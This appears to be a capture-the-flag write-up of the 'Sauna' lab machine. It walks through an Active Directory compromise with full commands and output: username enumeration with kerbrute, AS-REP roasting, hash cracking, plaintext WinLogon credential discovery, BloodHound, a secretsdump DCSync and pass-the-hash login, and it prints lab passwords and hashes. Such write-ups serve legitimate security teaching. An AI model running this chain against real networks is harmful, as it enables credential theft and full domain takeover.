nmap scan:

```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49686/tcp open  unknown
49699/tcp open  unknown
```

We can't enumerate anything with on smb or rpc without authenticating.

### Enumerating port 80

We have a website, and in `/about.html` there's a section where the are names, I'll createa  a list:

![image1](/assets/images/htb-sauna/sauna1.png)

```
fergussmith
shauncoins
sophiedriver
bowietaylor
hugobear
stevenkerb
f.smith
s.coins
s.driver
b.taylor
h.bear
s.kerb
fsmith
scoins
sdriver
btaylor
hbear
skerb
admin
administrator
```

### Using kerbrute to see if the usernames exists on the domain

Now I'm going to use kerbrute to see if this users exists, but before I need to find the name of the domain, I'll use ldapsearch:

```
ldapsearch -x -h 10.10.10.175 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

We have the domain name egotistical-bank.local, now I'll use kerbrute with the user list:

```
kerbrute -users user-list.txt -dc-ip 10.10.10.175 -domain egotistical-bank.local
Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

[*] Valid user => fsmith [NOT PREAUTH]
[*] Valid user => administrator
[*] No passwords were discovered :'(
```

### Trying AS-REP roast with the existent user

We have the `fsmith` user, let's try AS-REP roast:

```
sudo GetNPUsers.py -no-pass -dc-ip 10.10.10.175 egotistical-bank.local/fsmith
[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:63f9f3f0f63f1c3b3cb5bbb4ead74973$70a71a59b6c274708933c5f9a25b0223da771052d4883fabd76b19e106d2695524e2555ddd2dc34feb31113209cd9e8bf36862a5edcee1e3bb2f8fb5e5098aa3967e01b13e6e28b2c13f9379d4a041a0246f0dc980bafb47e3af8cc32f614929af68d158a5fec22276eaaf5e684a5fe6b920f52a35306dd92d9f7787f1ca9858ab36468c89d0de6da5682ceadf1ea167d2e02b51ffaa7dc834bb467572c3fda3d025823a2d3e5310781b90f92e5bd1bd260ddde3549668d1e6f52553ae759bbd40631c4bc40015894c3a210ca0f1ff0a3d0d8199f1b602d655d8e0a3b1465615543c3729cc31ea55d3bb0bddb93be716d7e0a26ce1a1db000086e40e05e99dea
```

I'll crack the hash with hashcat:

### Cracking the hash
```
.\hashcat.exe -m 18200 .\hash.txt .\rockyou.txt
```

And the password is: `Thestrokes23`


### Connecting with evil-winrm and start enumerating for privesc vectors

```
evil-winrm -i 10.10.10.175 -u fsmith -p "Thestrokes23"
```

I'm going to run the privilege escalation script `PrivescCheck.ps1`

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> import-module .\PrivescCheck.ps1
*Evil-WinRM* PS C:\Users\FSmith\Documents> Invoke-PrivescCheck
```

And it found this:

```
+------+------------------------------------------------+------+
| TEST | CREDS > WinLogon                               | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the Winlogon registry keys and check whether    |
|      | they contain any clear-text password. Entries that    |
|      | have an empty password field are filtered out.        |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Domain   : EGOTISTICALBANK
Username : EGOTISTICALBANK\svc_loanmanager
Password : Moneymakestheworldgoround!
```

So there were these credentials in the WinLogon registry key.

### Login as svc_loanmanager

Trying with svc_loanmager I can't login so in the fsmith shell I do:

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```

And the username is `svc_loanmgr`:

```
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p "Moneymakestheworldgoround!"
```

### Enumerating with bloodhound

First let's upload `SharpHound`:

```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> upload SharpHound.exe
```

Collect all:

```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> .\SharpHound.exe -c all
```

Download the zip:

```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> download 20201220153851_BloodHound.zip
```

And throw the zip into Bloodhound after that selecting the `SVC_LOANMGR` account and then *First Degree Object Control* we have this:

![image2](/assets/images/htb-sauna/sauna2.png)

![image3](/assets/images/htb-sauna/sauna3.png)

So we can use `secretsdump.py` to get the administrator hash:

```
sudo secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
---
---
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::                                                                         
---
---
```

And with evil-winrm we can login with the hash:

```
evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff
```
